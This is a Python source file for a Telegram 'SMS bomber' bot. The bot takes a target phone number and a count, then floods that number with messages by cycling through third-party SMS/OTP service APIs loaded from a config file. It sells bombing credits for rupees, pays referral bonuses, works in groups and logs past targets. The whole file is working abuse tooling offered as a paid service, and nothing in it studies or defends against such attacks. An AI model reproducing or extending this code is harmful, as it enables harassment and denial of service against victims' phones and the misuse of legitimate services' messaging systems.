# bot.py
# ULTIMATE SMS BOMBER BOT - FULL CUSTOM VERSION
# (c) @lordzenox | @zenoxtool

import logging
import asyncio
import json
import random
import requests
import re
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

from config import *
import database as db

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# LOAD APIS
# ============================================================

def load_apis():
    try:
        with open(SERVICES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data.get('services', [])
    except:
        return []

APIS = load_apis()
print(f"✅ Loaded {len(APIS)} APIs")

# ============================================================
# PHONE FORMATTING
# ============================================================

def format_phone(phone, fmt):
    phone = phone.strip()
    if fmt == "with_plus91":
        return f"+91{phone}"
    elif fmt == "91-":
        return f"91-{phone}"
    return phone

# ============================================================
# SEND BOMBS
# ============================================================

async def send_bombs(phone, count):
    """Send SMS with custom count"""
    success = 0
    failed = 0
    apis = APIS[:MAX_APIS_PER_BOMB]
    random.shuffle(apis)
    
    # Limit count
    if count > MAX_SMS_LIMIT:
        count = MAX_SMS_LIMIT
    
    # Use APIs in loop
    for i in range(count):
        if not apis:
            break
        
        api = apis[i % len(apis)]
        
        try:
            formatted = format_phone(phone, api.get('phone_format', 'raw'))
            url = api['url'].replace('{phone}', formatted)
            
            headers = api.get('headers', {})
            data = api.get('data', {})
            
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str):
                        data[k] = v.replace('{phone}', formatted)
            
            if '_raw' in data:
                raw = data['_raw'].replace('{phone}', formatted)
                resp = requests.request(api['method'], url, headers=headers, data=raw, timeout=API_TIMEOUT)
            else:
                resp = requests.request(api['method'], url, headers=headers, json=data, timeout=API_TIMEOUT)
            
            if resp.status_code in [200, 201, 202, 204]:
                success += 1
                db.update_api_stats(api['name'], True)
            else:
                failed += 1
                db.update_api_stats(api['name'], False)
                
        except:
            failed += 1
        
        await asyncio.sleep(REQUEST_DELAY)
    
    return success, failed

# ============================================================
# MAIN MENU
# ============================================================

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    balance = db.get_balance(user_id)
    stats = db.get_user_stats(user_id)
    
    text = f"""🔥 **{BOT_NAME}** {VERSION} 🔥

👤 **User:** @{update.effective_user.username or 'Unknown'}
💰 **Balance:** {balance} coins
💣 **Total Bombs:** {stats['total_bombs'] if stats else 0}
📱 **SMS Sent:** {stats['total_sms'] if stats else 0}
👥 **Referrals:** {db.get_referral_count(user_id)}

━━━━━━━━━━━━━━━━━━━━━
📌 **Select an option below:**
"""
    
    keyboard = [
        [InlineKeyboardButton("📱 SEND SMS", callback_data="send_sms")],
        [InlineKeyboardButton("🎥 VIDEOS", callback_data="videos")],
        [InlineKeyboardButton("⭐ CREDITS", callback_data="credits")],
        [InlineKeyboardButton("🎯 REDEEM", callback_data="redeem")],
        [InlineKeyboardButton("👥 REFER", callback_data="refer")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("📋 MY SMS HISTORY", callback_data="history")],
        [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy")],
        [InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info")]
    ]
    
    # Admin buttons
    if db.is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🔐 ADMIN PANEL", callback_data="admin_panel")])
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============================================================
# START COMMAND
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Group support
    if update.message.chat.type in ['group', 'supergroup']:
        await update.message.reply_text(
            "🤖 **Bot is active in this group!**\n\n"
            "Use /bomb @username or /bomb reply_to_message to bomb someone!",
            parse_mode='Markdown'
        )
        return
    
    if not db.get_user(user_id):
        ref = context.args[0] if context.args else None
        db.create_user(user_id, user.username or "User", user.first_name, ref)
    
    await main_menu(update, context)

# ============================================================
# SEND SMS (BOMB) - With Custom Count
# ============================================================

async def send_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned!")
        return
    
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    # Check if in group - mention or reply
    if update.message.chat.type in ['group', 'supergroup']:
        target = None
        
        # Check if replying to a message
        if update.message.reply_to_message:
            target = update.message.reply_to_message.from_user.username
            if target:
                target = target.strip()
        
        # Check if mentioning someone
        if not target and update.message.text:
            mentions = re.findall(r'@(\w+)', update.message.text)
            if mentions:
                target = mentions[0]
        
        if target:
            # Bomb the mentioned user's phone? No, we need phone number
            await update.message.reply_text(
                "❌ In groups, please provide a phone number!\n"
                "Usage: `/bomb 9876543210 count`\n"
                "Example: `/bomb 9876543210 50` (50 SMS)\n"
                "Example: `/bomb 9876543210 unlimited`",
                parse_mode='Markdown'
            )
            return
        else:
            await update.message.reply_text(
                "❌ Please provide a phone number!\n"
                "Usage: `/bomb 9876543210 count`",
                parse_mode='Markdown'
            )
            return
    
    # Normal mode - parse phone and count
    if not context.args:
        await update.message.reply_text(
            "❌ **Usage:** `/bomb 9876543210 count`\n\n"
            "📱 **Examples:**\n"
            "`/bomb 9876543210 50` - Send 50 SMS\n"
            "`/bomb 9876543210 unlimited` - Send unlimited (max 10000)\n"
            "`/bomb 9876543210` - Send 10 SMS (default)",
            parse_mode='Markdown'
        )
        return
    
    phone = context.args[0].strip()
    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text("❌ Invalid phone number!")
        return
    
    # Get count
    count = 10  # default
    if len(context.args) > 1:
        if context.args[1].lower() in ['unlimited', '0', 'max']:
            count = MAX_SMS_LIMIT
        else:
            try:
                count = int(context.args[1])
                if count < 1:
                    count = 1
                if count > MAX_SMS_LIMIT:
                    count = MAX_SMS_LIMIT
            except:
                count = 10
    
    # Calculate cost
    total_cost = count * BOMB_COST
    balance = db.get_balance(user_id)
    
    if balance < total_cost:
        await update.message.reply_text(
            f"❌ **Insufficient coins!**\n\n"
            f"Need: {total_cost} coins\n"
            f"Balance: {balance} coins\n"
            f"Cost per SMS: {BOMB_COST} coins\n\n"
            f"💡 /buy - Purchase more coins\n"
            f"👥 /refer - Get free coins",
            parse_mode='Markdown'
        )
        return
    
    # Deduct coins
    db.deduct_coins(user_id, total_cost, f"Bombing {phone} ({count} SMS)")
    
    msg = await update.message.reply_text(
        f"🔥 **BOMBING STARTED!**\n\n"
        f"📱 Target: `{phone}`\n"
        f"📊 Count: {count} SMS\n"
        f"💰 Cost: {total_cost} coins\n"
        f"📡 Sending...\n\n"
        f"⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    # Send bombs
    success, failed = await send_bombs(phone, count)
    
    db.add_bomb_stats(user_id, phone, success + failed, success, failed, total_cost)
    
    await msg.edit_text(
        f"✅ **BOMBING COMPLETE!**\n\n"
        f"📱 Target: `{phone}`\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n"
        f"📊 Total: {success + failed}\n"
        f"💰 Cost: {total_cost} coins\n\n"
        f"💡 /balance - Check balance",
        parse_mode='Markdown'
    )

# ============================================================
# BALANCE COMMAND
# ============================================================

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bal = db.get_balance(user_id)
    stats = db.get_user_stats(user_id)
    
    text = f"""💰 **YOUR BALANCE**

Coins: {bal}
Total Bombs: {stats['total_bombs'] if stats else 0}
Total SMS: {stats['total_sms'] if stats else 0}
Total Spent: {stats['total_spent'] if stats else 0}
Referrals: {db.get_referral_count(user_id)}
"""
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# REFER COMMAND
# ============================================================

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = db.get_referral_code(user_id)
    bot = (await context.bot.get_me()).username
    link = f"https://t.me/{bot}?start={code}"
    
    text = f"""👥 **REFERRAL SYSTEM**

Your Code: `{code}`
Your Link: {link}

💰 You get +{REFERRAL_BONUS} coins per referral!
📊 Total: {db.get_referral_count(user_id)} referrals

🔗 Share this link with your friends!
"""
    
    keyboard = [[
        InlineKeyboardButton(
            "📤 Share Link",
            url=f"https://t.me/share/url?url={link}&text=🔥%20Join%20the%20Ultimate%20SMS%20Bomber%20Bot!%20Get%20{REFERRAL_BONUS}%20free%20coins!"
        )
    ]]
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============================================================
# LEADERBOARD
# ============================================================

async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_leaderboard(10)
    if not users:
        await update.message.reply_text("❌ No users yet!")
        return
    
    text = "🏆 **TOP 10 USERS**\n\n"
    for i, u in enumerate(users, 1):
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        text += f"{medal} @{u[1] or 'Unknown'} - {u[2]} coins ({u[3]} bombs)\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# STATUS
# ============================================================

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_total_stats()
    text = f"""📊 **BOT STATUS**

🤖 Online ✅
📡 APIs: {len(APIS)}
👥 Users: {stats['users']}
💰 Coins: {stats['coins']}
💣 Bombs: {stats['bombs']}
📱 SMS: {stats['sms']}
👑 Admins: {stats['admins']}
🚫 Banned: {stats['banned']}
"""
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# HELP
# ============================================================

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"""📚 **{BOT_NAME} HELP**

**Commands:**
/start - Main menu
/bomb <number> <count> - Send SMS
/balance - Check balance
/refer - Get referral link
/leaderboard - Top users
/status - Bot status
/help - This menu

**📱 Bomb Examples:**
`/bomb 9876543210` - 10 SMS
`/bomb 9876543210 50` - 50 SMS
`/bomb 9876543210 unlimited` - Max SMS

**💰 Coins:**
Cost: {BOMB_COST} coin/SMS
Free: {FREE_COINS} coins on start
Referral: +{REFERRAL_BONUS} coins
"""
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# TRANSFER CREDITS
# ============================================================

async def transfer_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ **Usage:** `/transfer <user_id> <amount>`\n\n"
            "Example: `/transfer 123456789 50`",
            parse_mode='Markdown'
        )
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if amount <= 0:
        await update.message.reply_text("❌ Amount must be positive!")
        return
    
    if user_id == target:
        await update.message.reply_text("❌ Cannot transfer to yourself!")
        return
    
    success, msg = db.transfer_coins(user_id, target, amount)
    await update.message.reply_text(msg)

# ============================================================
# BUY CREDITS
# ============================================================

async def buy_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = f"""💳 **BUY CREDITS**

💰 **Current Balance:** {db.get_balance(user_id)} coins

**Packages:**
📦 100 coins = ₹10
📦 500 coins = ₹40
📦 1000 coins = ₹70
📦 5000 coins = ₹300

📌 **Contact admin to purchase:**
👑 {OWNER}
📢 {CHANNEL1}
"""
    
    keyboard = [
        [InlineKeyboardButton("👑 Contact Owner", url="https://t.me/lordzenox")],
        [InlineKeyboardButton("📢 Join Channel", url="https://t.me/zenoxtool")]
    ]
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============================================================
# REDEEM CODE
# ============================================================

async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem <code>`")
        return
    
    code = context.args[0].strip()
    success, msg = db.use_redeem_code(user_id, code)
    await update.message.reply_text(msg)

# ============================================================
# MY SMS HISTORY
# ============================================================

async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    logs = db.get_bomb_logs(user_id, 10)
    
    if not logs:
        await update.message.reply_text("📋 No SMS history yet!")
        return
    
    text = "📋 **LAST 10 BOMBING SESSIONS**\n\n"
    for i, log in enumerate(logs, 1):
        target, sms_count, success, failed, cost, date = log
        text += f"{i}. 📱 `{target}`\n"
        text += f"   ✅ {success} ❌ {failed} | {sms_count} SMS | {cost} coins\n"
        text += f"   📅 {date[:10]}\n\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# ADMIN PANEL
# ============================================================

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if not db.is_admin(user_id):
        await query.edit_message_text("❌ Unauthorized!")
        return
    
    text = f"""🔐 **ADMIN PANEL**

📊 **Stats:**
Total Users: {db.get_total_stats()['users']}
Total Coins: {db.get_total_stats()['coins']}
Total Bombs: {db.get_total_stats()['bombs']}
Total SMS: {db.get_total_stats()['sms']}

**Commands:**
/addcoins <id> <amount>
/removecoins <id> <amount>
/ban <id>
/unban <id>
/broadcast <msg>
/makeadmin <id>
/removeadmin <id>
/createredeem <code> <amount>
/stats
/status
"""
    
    keyboard = [
        [InlineKeyboardButton("📊 Full Stats", callback_data="full_stats")],
        [InlineKeyboardButton("👑 Admins List", callback_data="admins_list")],
        [InlineKeyboardButton("🚫 Banned Users", callback_data="banned_list")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_menu")]
    ]
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /addcoins <user_id> <amount>")
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if db.add_coins(target, amount, f"Added by admin {user_id}"):
        await update.message.reply_text(f"✅ Added {amount} coins to {target}")
        db.log_admin_action(user_id, "add_coins", target, f"Added {amount} coins")
    else:
        await update.message.reply_text("❌ Failed!")

async def removecoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /removecoins <user_id> <amount>")
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if db.deduct_coins(target, amount, f"Removed by admin {user_id}"):
        await update.message.reply_text(f"✅ Removed {amount} coins from {target}")
        db.log_admin_action(user_id, "remove_coins", target, f"Removed {amount} coins")
    else:
        await update.message.reply_text("❌ Failed!")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /ban <user_id>")
        return
    
    target = int(context.args[0])
    db.ban_user(target)
    await update.message.reply_text(f"✅ Banned {target}")
    db.log_admin_action(user_id, "ban", target, "Banned user")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /unban <user_id>")
        return
    
    target = int(context.args[0])
    db.unban_user(target)
    await update.message.reply_text(f"✅ Unbanned {target}")
    db.log_admin_action(user_id, "unban", target, "Unbanned user")

async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner(user_id):
        await update.message.reply_text("❌ Only owner can make admins!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /makeadmin <user_id>")
        return
    
    target = int(context.args[0])
    db.add_admin(target)
    await update.message.reply_text(f"✅ Made {target} admin")
    db.log_admin_action(user_id, "make_admin", target, "Made admin")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner(user_id):
        await update.message.reply_text("❌ Only owner can remove admins!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /removeadmin <user_id>")
        return
    
    target = int(context.args[0])
    if target == OWNER_ID:
        await update.message.reply_text("❌ Cannot remove owner!")
        return
    
    db.remove_admin(target)
    await update.message.reply_text(f"✅ Removed {target} from admin")
    db.log_admin_action(user_id, "remove_admin", target, "Removed admin")

async def create_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /createredeem <code> <amount>")
        return
    
    code = context.args[0].upper()
    amount = int(context.args[1])
    
    db.create_redeem_code(code, amount, user_id)
    await update.message.reply_text(f"✅ Created redeem code: `{code}` ({amount} coins)")
    db.log_admin_action(user_id, "create_redeem", 0, f"Code: {code}, Amount: {amount}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /broadcast <message>")
        return
    
    msg = " ".join(context.args)
    users = db.get_all_users()
    sent = 0
    
    for u in users:
        try:
            await context.bot.send_message(u[0], f"📢 **ANNOUNCEMENT**\n\n{msg}", parse_mode='Markdown')
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")
    db.log_admin_action(user_id, "broadcast", 0, f"Sent to {sent} users")

# ============================================================
# CALLBACK HANDLERS
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "send_sms":
        await query.edit_message_text(
            "📱 **SEND SMS**\n\n"
            "Usage: `/bomb 9876543210 count`\n\n"
            "Examples:\n"
            "`/bomb 9876543210 50` - 50 SMS\n"
            "`/bomb 9876543210 unlimited` - Max SMS\n"
            "`/bomb 9876543210` - Default 10 SMS\n\n"
            f"💰 Cost: {BOMB_COST} coins per SMS",
            parse_mode='Markdown'
        )
    
    elif data == "videos":
        await query.edit_message_text(
            "🎥 **VIDEOS**\n\n"
            "📌 Tutorial videos coming soon!\n\n"
            "📢 Join channel for updates:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url="https://t.me/zenoxtool")]
            ])
        )
    
    elif data == "credits":
        bal = db.get_balance(user_id)
        stats = db.get_user_stats(user_id)
        await query.edit_message_text(
            f"⭐ **YOUR CREDITS**\n\n"
            f"💰 Balance: {bal} coins\n"
            f"💣 Total Bombs: {stats['total_bombs'] if stats else 0}\n"
            f"📱 SMS Sent: {stats['total_sms'] if stats else 0}\n"
            f"👥 Referrals: {db.get_referral_count(user_id)}\n"
            f"💸 Total Spent: {stats['total_spent'] if stats else 0}\n\n"
            f"💡 /buy - Purchase more coins\n"
            f"👥 /refer - Get free coins"
        )
    
    elif data == "redeem":
        await query.edit_message_text(
            "🎯 **REDEEM CODE**\n\n"
            "Usage: `/redeem <code>`\n\n"
            "Example: `/redeem BOMBER2024`\n\n"
            "📌 Contact admin for redeem codes!",
            parse_mode='Markdown'
        )
    
    elif data == "refer":
        code = db.get_referral_code(user_id)
        bot = (await context.bot.get_me()).username
        link = f"https://t.me/{bot}?start={code}"
        await query.edit_message_text(
            f"👥 **REFERRAL SYSTEM**\n\n"
            f"Your Code: `{code}`\n"
            f"Your Link: {link}\n\n"
            f"💰 You get +{REFERRAL_BONUS} coins per referral!\n"
            f"📊 Total: {db.get_referral_count(user_id)} referrals",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(
                    "📤 Share Link",
                    url=f"https://t.me/share/url?url={link}&text=🔥%20Join%20the%20Ultimate%20SMS%20Bomber%20Bot!%20Get%20{REFERRAL_BONUS}%20free%20coins!"
                )
            ]])
        )
    
    elif data == "stats":
        stats = db.get_total_stats()
        await query.edit_message_text(
            f"📊 **GLOBAL STATS**\n\n"
            f"👥 Users: {stats['users']}\n"
            f"💰 Coins: {stats['coins']}\n"
            f"💣 Bombs: {stats['bombs']}\n"
            f"📱 SMS: {stats['sms']}\n"
            f"👑 Admins: {stats['admins']}\n"
            f"🚫 Banned: {stats['banned']}\n"
            f"📡 APIs: {len(APIS)}"
        )
    
    elif data == "history":
        logs = db.get_bomb_logs(user_id, 10)
        if not logs:
            await query.edit_message_text("📋 No SMS history yet!")
            return
        text = "📋 **LAST 10 BOMBING SESSIONS**\n\n"
        for i, log in enumerate(logs, 1):
            target, sms_count, success, failed, cost, date = log
            text += f"{i}. 📱 `{target}`\n"
            text += f"   ✅ {success} ❌ {failed} | {sms_count} SMS | {cost} coins\n"
            text += f"   📅 {date[:10]}\n\n"
        await query.edit_message_text(text, parse_mode='Markdown')
    
    elif data == "buy":
        await buy_credits(update, context)
        await query.delete_message()
    
    elif data == "transfer":
        await query.edit_message_text(
            "🔄 **TRANSFER CREDITS**\n\n"
            "Usage: `/transfer <user_id> <amount>`\n\n"
            "Example: `/transfer 123456789 50`\n\n"
            "⚠️ You can only transfer to existing users!",
            parse_mode='Markdown'
        )
    
    elif data == "info":
        await query.edit_message_text(
            f"ℹ️ **{BOT_NAME} INFO**\n\n"
            f"📅 Version: {VERSION}\n"
            f"👑 Owner: {OWNER}\n"
            f"📢 Channel: {CHANNEL1}\n"
            f"📡 APIs: {len(APIS)}\n"
            f"💰 Cost: {BOMB_COST} coin/SMS\n"
            f"🎁 Free: {FREE_COINS} coins\n"
            f"👥 Referral: +{REFERRAL_BONUS} coins\n\n"
            f"📌 Made with ❤️ by {OWNER}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Channel", url="https://t.me/zenoxtool"),
                 InlineKeyboardButton("👑 Owner", url="https://t.me/lordzenox")]
            ])
        )
    
    elif data == "admin_panel":
        await admin_panel_callback(update, context)
    
    elif data == "full_stats":
        if not db.is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized!")
            return
        stats = db.get_total_stats()
        await query.edit_message_text(
            f"📊 **FULL STATS**\n\n"
            f"👥 Users: {stats['users']}\n"
            f"💰 Coins: {stats['coins']}\n"
            f"💣 Bombs: {stats['bombs']}\n"
            f"📱 SMS: {stats['sms']}\n"
            f"👑 Admins: {stats['admins']}\n"
            f"🚫 Banned: {stats['banned']}\n"
            f"📡 APIs: {len(APIS)}"
        )
    
    elif data == "admins_list":
        if not db.is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized!")
            return
        admins = db.get_all_admins()
        text = "👑 **ADMINS LIST**\n\n"
        for a in admins:
            text += f"👤 {a[1] or 'User'} - `{a[0]}`\n"
        await query.edit_message_text(text, parse_mode='Markdown')
    
    elif data == "banned_list":
        if not db.is_admin(user_id):
            await query.edit_message_text("❌ Unauthorized!")
            return
        # Get banned users
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT user_id, username, first_name FROM users WHERE is_banned = 1")
        banned = c.fetchall()
        conn.close()
        
        if not banned:
            await query.edit_message_text("🚫 No banned users!")
            return
        
        text = "🚫 **BANNED USERS**\n\n"
        for b in banned:
            text += f"👤 {b[1] or b[2] or 'User'} - `{b[0]}`\n"
        await query.edit_message_text(text, parse_mode='Markdown')
    
    elif data == "back_menu":
        await query.edit_message_text(
            "🔄 **Returning to main menu...**\n\n"
            "Click /start or use /menu"
        )

# ============================================================
# ERROR HANDLER
# ============================================================

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Please try again later.")

# ============================================================
# MAIN
# ============================================================

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", send_sms))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("refer", refer))
    app.add_handler(CommandHandler("leaderboard", leaderboard))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("menu", main_menu))
    app.add_handler(CommandHandler("transfer", transfer_credits))
    app.add_handler(CommandHandler("buy", buy_credits))
    app.add_handler(CommandHandler("redeem", redeem_code))
    app.add_handler(CommandHandler("history", history))
    
    # Admin Commands
    app.add_handler(CommandHandler("addcoins", addcoins))
    app.add_handler(CommandHandler("removecoins", removecoins))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("makeadmin", make_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))
    app.add_handler(CommandHandler("createredeem", create_redeem))
    app.add_handler(CommandHandler("broadcast", broadcast))
    
    # Callback
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Error
    app.add_error_handler(error_handler)
    
    print(f"🚀 {BOT_NAME} {VERSION} Started!")
    print(f"👑 Owner: {OWNER}")
    print(f"📡 APIs: {len(APIS)}")
    print(f"👥 Admins: {len(ADMIN_IDS)}")
    print("=" * 40)
    
    app.run_polling()

if __name__ == "__main__":
    main()
